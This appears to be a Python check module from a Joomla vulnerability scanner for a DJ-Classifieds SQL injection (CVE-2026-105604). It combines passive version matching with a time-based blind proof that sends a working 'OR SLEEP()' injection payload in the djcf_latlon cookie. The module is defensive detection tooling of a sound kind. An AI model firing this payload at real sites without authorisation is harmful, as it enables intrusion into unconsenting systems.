from __future__ import annotations

import secrets
import time
from typing import Any
from urllib.parse import quote

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-105604"
NAME = "DJ-Classifieds unauthenticated frontend search SQL injection"
COMPONENT = "DJ-Classifieds"
AFFECTED_RULE = "DJ-Classifieds 1.0 through 3.11.2; fixed in 3.11.3"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
ITEMS_PATH = "/index.php?option=com_djclassifieds&view=items"
COOKIE_NAME = "djcf_latlon"
SLEEP_THRESHOLD = 1.5


def _numeric_version(version: str | None) -> str | None:
    import re

    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("3.11.3")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("djclassifieds", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="DJ-Classifieds was not detected.", action="No action is required unless DJ-Classifieds is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected DJ-Classifieds {version}, within the affected range below 3.11.3."
        action = "Upgrade DJ-Classifieds to 3.11.3 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected DJ-Classifieds {version}, which includes the 3.11.3 distance-query fix."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "DJ-Classifieds was detected, but its version could not be determined."
        action = "Determine the installed DJ-Classifieds version and upgrade to 3.11.3 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _cookie_value(seconds: int) -> str:
    payload = quote(f"0) OR SLEEP({seconds}) OR (0", safe="")
    return f"{COOKIE_NAME}={payload}_0"


def _timed_request(client: HttpClient, url: str, headers: dict[str, str], timeout: int) -> tuple[dict[str, Any], float]:
    start = time.perf_counter()
    response = client.request(url, headers=headers, timeout=timeout)
    return response, time.perf_counter() - start


def _items_url(base: str, items_url: str | None) -> str:
    url = items_url or f"{base}{ITEMS_PATH}"
    separator = "&" if "?" in url else "?"
    return f"{url}{separator}proofcms={secrets.token_hex(4)}"


def run_aggressive_probe(target_url: str, items_url: str | None = None, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Time-based blind proof through the djcf_latlon distance cookie.

    The 3.11.2 items model concatenates both cookie components into the
    ``radians(...)`` distance expression. A SLEEP(2) payload is evaluated
    twice by the expression, so a vulnerable target adds roughly four
    seconds over the baseline and the SLEEP(0) control. The 3.11.3 fix casts
    both values to float, which collapses the payload to 0.
    """
    base = normalize_url(target_url)
    url = _items_url(base, items_url)
    client = HttpClient(timeout=timeout, proxy=proxy)

    baseline, baseline_time = _timed_request(client, url, {}, timeout)
    if is_transport_error(baseline):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The DJ-Classifieds listing could not be reached ({transport_error_detail(baseline)}).", action="Retry when the target is reachable.")

    control, control_time = _timed_request(client, url, {"Cookie": _cookie_value(0)}, timeout)
    if is_transport_error(control):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The SLEEP(0) control failed in transit ({transport_error_detail(control)}).", action="Retry when the target is reachable.")

    slept, sleep_time = _timed_request(client, url, {"Cookie": _cookie_value(2)}, timeout)
    if is_transport_error(slept):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The SLEEP(2) probe failed in transit ({transport_error_detail(slept)}).", action="Retry when the target is reachable.")

    reference = max(baseline_time, control_time)
    delta = sleep_time - reference
    evidence = {
        "items_url": url,
        "cookie_payload": _cookie_value(2),
        "baseline_seconds": round(baseline_time, 3),
        "control_seconds": round(control_time, 3),
        "sleep_seconds": round(sleep_time, 3),
        "delta_seconds": round(delta, 3),
        "threshold_seconds": SLEEP_THRESHOLD,
        "baseline_status": baseline.get("status"),
        "sleep_status": slept.get("status"),
    }
    if slept.get("status") == 200 and delta >= SLEEP_THRESHOLD:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=url,
            evidence=evidence,
            detail=(
                f"The djcf_latlon cookie with a SLEEP(2) payload delayed the listing by {delta:.2f}s "
                f"over the baseline/control ({reference:.2f}s), proving server-side SQL evaluation. "
                "No data was read or written."
            ),
            action="Upgrade DJ-Classifieds to 3.11.3 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=url,
        evidence=evidence,
        detail=(
            f"The SLEEP(2) payload added {delta:.2f}s over the baseline/control, below the "
            f"{SLEEP_THRESHOLD:.1f}s threshold; the distance query did not evaluate the injection."
        ),
        action="Upgrade affected DJ-Classifieds versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = _items_url(base, None)
    response = HttpClient(timeout=timeout, proxy=proxy).request(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The DJ-Classifieds listing could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    body = response.get("body") or ""
    if response.get("status") == 200 and ("djcf" in body.lower() or "dj-classifieds" in body.lower()):
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The DJ-Classifieds listing is reachable; the time-based SQL proof was not sent in safe mode.", action="Use aggressive mode on an authorized staging site to verify the distance query.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The DJ-Classifieds listing did not expose a recognizable component surface.", action="Verify the component and menu configuration on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because DJ-Classifieds was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            items_url=aggressive_value(aggressive_args, aggressive_command, "items_url"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (reachability) and aggressive (time-based SQL) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["djclassifieds"], "references": ["https://www.cve.org/CVERecord?id=CVE-2026-105604", "https://mysites.guru/vulnerabilities/CVE-2026-105604", "https://dj-extensions.com/dj-classifieds"]}
